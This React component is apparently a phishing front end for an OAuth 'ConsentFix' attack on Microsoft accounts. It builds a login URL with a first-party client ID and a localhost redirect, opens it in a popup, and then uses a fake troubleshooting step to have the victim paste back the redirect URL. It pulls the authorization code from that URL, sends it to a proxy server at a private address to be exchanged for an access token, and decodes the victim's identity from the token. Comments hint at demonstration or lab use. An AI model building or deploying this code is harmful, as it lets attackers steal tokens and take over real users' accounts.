import React, { useState, useEffect, useRef } from 'react';
import './App.css';
import LoginView from './components/LoginView';
import ProcessingView from './components/ProcessingView';
import TroubleshootView from './components/TroubleshootView';
import ResultView from './components/ResultView';

const ConsentFix = () => {
  const [email, setEmail] = useState('');
  const [view, setView] = useState('login');
  const [error, setError] = useState('');
  const [parsedEmail, setParsedEmail] = useState('');
  const [accessToken, setAccessToken] = useState('');
  const [pastedUrl, setPastedUrl] = useState('');
  const textAreaRef = useRef(null);
  const timeoutRef = useRef(null);

  // Email validation
  const isValidEmail = (email) => {
    const value = String(email).toLowerCase();
    const formatRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!formatRe.test(value)) return false;
    const allowedDomains = [
      'gmail.com',
      'microsoft.com',
      'outlook.com',
      'hotmail.com',
    ];
    const domain = value.split('@')[1];
    
    return allowedDomains.some(d => domain === d || domain.endsWith(`.${d}`));
  };

  // Handle form submission
  const handleSubmit = (e) => {
    e.preventDefault();
    
    if (!email.trim()) {
      setError('Please enter your email address');
      return;
    }
    
    if (!isValidEmail(email)) {
      setError('Please enter a valid email address');
      return;
    }
    
    setError('');
    
    // Generate URL
    const encodedEmail = encodeURIComponent(email);
    const client_id = encodeURIComponent('04b07795-8ddb-461a-bbee-02f9e1bf7b46');
    const redirect_uri = encodeURIComponent('http://localhost:8400/');
    const resource = encodeURIComponent('00000002-0000-0000-c000-000000000000');
    const state = encodeURIComponent('ab12cd34');
    const prompt = encodeURIComponent('select_account');
    const base = 'https://login.microsoftonline.com/organizations/oauth2/authorize';

    const url = `${base}?client_id=${client_id}&response_type=code&redirect_uri=${redirect_uri}&resource=${resource}&state=${state}&prompt=${prompt}&login_hint=${encodedEmail}`;
    setView('processing');
    
    // Open popup after short delay
    setTimeout(() => {
      openAuthenticationPopup(url);
    }, 500);
    
    timeoutRef.current = setTimeout(() => {
      setView('troubleshoot');
    }, 10000);
  };

  // Open popup
  const openAuthenticationPopup = (url) => {
    const popupWidth = 600;
    const popupHeight = 500;
    const left = (window.screen.width - popupWidth) / 2;
    const top = (window.screen.height - popupHeight) / 2;
    
    window.open(
      url,
      'MCAuthentication',
      `width=${popupWidth},height=${popupHeight},top=${top},left=${left},resizable=yes,scrollbars=yes,toolbar=no,menubar=no,location=no,status=no`
    );
  };

  // Parse code from URL
  const parseCodeFromUrl = (url) => {
    try {
      const urlObj = new URL(url);
      const codeParam = urlObj.searchParams.get('code');
      if (codeParam) {
        return decodeURIComponent(codeParam);
      }
    } catch (e) {
      const match = url.match(/code=([^&]+)/);
      if (match) {
        return decodeURIComponent(match[1]);
      }
    }
    return null;
  };

  // Handle pasted URL submission
  const handleSubmitPastedUrl = async (url) => {
    if (!url.trim()) {
      setError('Please paste a URL first');
      return;
    }

    const extractedCode = parseCodeFromUrl(url);
    if (!extractedCode) {
      setError('No authorization code found in URL');
      return;
    }
    
    // Clean state
    if (textAreaRef.current) {
      textAreaRef.current.value = '';
    }
    setPastedUrl('');
    
    // Exchange code for token
    await exchangeCodeForToken(extractedCode);
  };

  // Exchange code for access token
  const exchangeCodeForToken = async (code) => {
    try {
      // Use proxy to request token there (CORS ISSUE)
      const response = await fetch('http://10.10.10.131:3001/exchange-token', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ code })
  });
      
      if (!response.ok) {
        const errorData = await response.text();
        throw new Error(`Proxy error: ${response.status} - ${errorData}`);
      }
      
      const data = await response.json();
      
      // For the moment it is setted up so we recieve the access_token back to the main app, tbd if this is useless
      if (data.access_token) {
        setAccessToken(data.access_token);
        
        // Parse JWT to get email from token
        try {
          const base64Url = data.access_token.split('.')[1];
          const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
          const jsonPayload = decodeURIComponent(atob(base64).split('').map(c => {
            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
          }).join(''));
          
          const tokenData = JSON.parse(jsonPayload);
          const emailFromToken = tokenData.upn || tokenData.email || tokenData.preferred_username;
          
          if (emailFromToken) {
            setParsedEmail(emailFromToken);
            setView('result');
          } else {
            setError('Could not extract email from token');
            setView('login');
          }
        } catch (parseError) {
          console.error('Error parsing JWT:', parseError);
          setError('Error parsing token');
          setView('login');
        }
      } else {
        setError('No access token in response');
        setView('login');
      }
    } catch (error) {
      console.error('Error exchanging code for token:', error);
      setError('Failed to exchange code for token');
      setView('login');
    }
  };

  useEffect(() => {
    return () => {
      if (timeoutRef.current) {
        clearTimeout(timeoutRef.current);
      }
    };
  }, []);

  return (
    <div className="app-container">
      {view === 'login' && (
        <LoginView 
          email={email}
          setEmail={setEmail}
          error={error}
          handleSubmit={handleSubmit}
          setView={setView}
        />
      )}
      {view === 'processing' && (
        <ProcessingView 
          email={email}
          setView={setView}
        />
      )}
      {view === 'troubleshoot' && (
        <TroubleshootView 
          email={email}
          pastedUrl={pastedUrl}
          setPastedUrl={setPastedUrl}
          handleSubmitPastedUrl={handleSubmitPastedUrl}
          textAreaRef={textAreaRef}
          setView={setView}
        />
      )}
      {view === 'result' && (
        // Im going to send to the result the parsedEmail and accessToken in case we want the app to be demonstrative (print the token for example)
        <ResultView 
          parsedEmail={parsedEmail}
          accessToken={accessToken}
          setView={setView}
        />
      )}
      
      <footer className="footer">
        <a href="#" className="footer-link">Terms of use</a>
        <a href="#" className="footer-link">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
      </footer>
    </div>
  );
};

export default ConsentFix;